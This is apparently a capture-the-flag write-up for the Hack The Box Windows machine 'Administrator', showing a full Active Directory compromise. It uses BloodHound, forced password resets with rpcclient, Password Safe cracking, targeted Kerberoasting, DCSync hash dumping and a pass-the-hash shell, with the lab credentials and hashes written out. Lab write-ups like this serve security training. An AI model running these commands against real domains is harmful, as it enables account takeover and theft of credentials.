---
icon: windows
---

# Administrator - Medium

<figure><img src="../../.gitbook/assets/image (1713).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/administrator"><strong>Administrator</strong></a></p></figcaption></figure>

## <mark style="color:blue;">Gaining Access</mark>

Nmap Scan:

```
#Nmap TCP
nmap -A -T4 -p- -Pn 10.10.11.42 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-17 07:41 EDT
Nmap scan report for 10.10.11.42
Host is up (0.057s latency).
Not shown: 65509 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-17 18:42:07Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
50622/tcp open  msrpc         Microsoft Windows RPC
59290/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
59295/tcp open  msrpc         Microsoft Windows RPC
59302/tcp open  msrpc         Microsoft Windows RPC
59307/tcp open  msrpc         Microsoft Windows RPC
59320/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=9/17%OT=21%CT=1%CU=36004%PV=Y%DS=2%DC=T%G=Y%TM=68CA9ED
OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=2%ISR=109%TI=I%CI=I%II=I%SS=S%TS=
OS:A)SEQ(SP=105%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=107%GCD=1%ISR
OS:=10B%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=107%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS
OS:=S%TS=A)SEQ(SP=FD%GCD=1%ISR=10D%TI=I%CI=I%II=I%SS=S%TS=A)OPS(O1=M542NW8S
OS:T11%O2=M542NW8ST11%O3=M542NW8NNT11%O4=M542NW8ST11%O5=M542NW8ST11%O6=M542
OS:ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)ECN(R=Y%DF=Y%T=
OS:80%W=FFFF%O=M542NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2
OS:(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%
OS:F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%
OS:T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD
OS:=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL
OS:=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m02s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-09-17T18:43:09
|_  start_date: N/A

TRACEROUTE (using port 3306/tcp)
HOP RTT      ADDRESS
1   24.78 ms 10.10.16.1
2   59.64 ms 10.10.11.42
```

We are given some credentials for this box, before I start a winrm session with Olivia. I am going to take a look at bloodhound first

```
Olivia:ichliebedich
```

### <mark style="color:$primary;">Bloodhound Collection</mark>

```
netexec ldap 10.10.11.42 -u Olivia -p 'ichliebedich' --bloodhound --collection All --dns-server 10.10.11.42
```

Starting bloodhound

```
sudo neo4j start
bloodhound
```

### <mark style="color:$primary;">GenericAll</mark>

<figure><img src="../../.gitbook/assets/image (1714).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1715).png" alt=""><figcaption></figcaption></figure>

Olivia has GenericAll on Michael, that means we can change michael's password. I will do it via rpcclient

```
rpcclient -U "Olivia%ichliebedich" 10.10.11.42
```

```
setuserinfo2 michael 23 'Password123!
```

<figure><img src="../../.gitbook/assets/image (1716).png" alt=""><figcaption></figcaption></figure>

Let's see what we can do as the user Michael

### <mark style="color:$primary;">ForceChangePassword</mark>

<figure><img src="../../.gitbook/assets/image (1717).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1718).png" alt=""><figcaption></figcaption></figure>

Michael can change Benjamin's password, I will use the same technique as above.

```
rpcclient -U "michael%Password123!" 10.10.11.42
```

```
setuserinfo2 benjamin 23 'Password123!'
```

<figure><img src="../../.gitbook/assets/image (1719).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Enumerating FTP Port 21</mark>

Benjamin has ftp access

<figure><img src="../../.gitbook/assets/image (1720).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1721).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1722).png" alt=""><figcaption></figcaption></figure>

We found a password manager, I am going to attempt to crack it and gain access to it

### <mark style="color:$primary;">Cracking Password Safe V3 database</mark>

```
pwsafe2john Backup.psafe3 > psafe3.hash 
```

```
john psafe3.hash -w=/usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (1723).png" alt=""><figcaption></figcaption></figure>

I found this git [**repo**](https://github.com/pwsafe/pwsafe/releases?q=non-windows\&expanded=true) holding releases for the password safe manager, I am going to download and install the 1.20.0 version

To install it just run

```
sudo dpkg -i passwordsafe-ubuntu23-1.18.2-amd64.deb
```

<figure><img src="../../.gitbook/assets/image (1724).png" alt=""><figcaption></figcaption></figure>

If you run into this error just run the below command to install the necessary dependencies and try installing it again

```
sudo apt-get install -f
```

<figure><img src="../../.gitbook/assets/image (1725).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1726).png" alt=""><figcaption></figcaption></figure>

```
alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur
```

We got passwords for 3 users, I am going to use bloodhound and check to see if there are any misconfigured permissions on any of them

### <mark style="color:$primary;">GenericWrite</mark>

<figure><img src="../../.gitbook/assets/image (1727).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1728).png" alt=""><figcaption></figcaption></figure>

Emily has GenericWrite on ethan,

I am going to use the Targeted Kerberoast attack

targetedKerberoast is a Python script that, like many others (e.g. [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) ), prints a "kerberoast" hash for user accounts that have SPN's set. This tool brings the following additional functionality: for each user that does not have an SPN, it attempts to set one ( abusing write access to the attribute ), prints the "kerberoast" hash, and deletes the temporary SPN that was set for the operation

Before I begin the attack I must synchronize the time zone, because Kerberos authentication is very strict about time calibration.

```
sudo ntpdate 10.10.11.42
```

```
python3 ~/OSCP/tools/targetedKerberoast.py -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -d "Administrator.htb" --dc-ip 10.10.11.42
```

<figure><img src="../../.gitbook/assets/image (1729).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Cracking Ethan's hash</mark>

```
hashcat ethan-hash /usr/share/wordlists/rockyou.txt
```

```
hashcat ethan-hash /usr/share/wordlists/rockyou.txt --show
```

<figure><img src="../../.gitbook/assets/image (1730).png" alt=""><figcaption></figcaption></figure>

Now let's check out what Ethan can do

<figure><img src="../../.gitbook/assets/image (1731).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1732).png" alt=""><figcaption></figcaption></figure>

It's hard to see, but ETHAN has DCSync rights! This means we can export the hash of all domain users through Dcsync

```
impacket-secretsdump "administrator.htb/ethan:limpbizkit"@"10.10.11.42"
```

<figure><img src="../../.gitbook/assets/image (1733).png" alt=""><figcaption></figcaption></figure>

We grabbed the administrator's hash let's see if we can use it to get a shell over winrm

```
evil-winrm -i 10.10.11.42 -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```

<figure><img src="../../.gitbook/assets/image (1734).png" alt=""><figcaption></figcaption></figure>

We got a shell as admin!
